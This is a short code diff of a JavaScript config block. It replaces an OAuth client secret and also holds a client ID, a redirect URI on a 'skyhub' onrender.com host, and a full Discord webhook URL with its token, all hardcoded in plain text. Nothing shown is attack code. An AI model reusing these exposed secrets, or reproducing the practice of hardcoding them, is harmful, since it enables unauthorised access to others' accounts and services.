@@ -1,5 +1,5 @@
 //Config
-const client_secret = 'dec7f1a9-661c-4262-92b9-ed4d64a0fd95'
+const client_secret = 'RLe8Q~4H45TfGpzW64huDwUVDscDpT5eraeWzbuO'
 const client_id = '633c72ff-333a-495e-be20-8416cfbe7f5c'
 const redirect_uri = 'https://skyhub.onrender.com'
 const webhook_url = 'https://ptb.discord.com/api/webhooks/1113551902194552902/IKI4gMEgyAIT5rn4i-yYiH4pNA9AjRald5dOlxrBl_VOnRepx9Qqz-nD_5Sfs190VsRv'
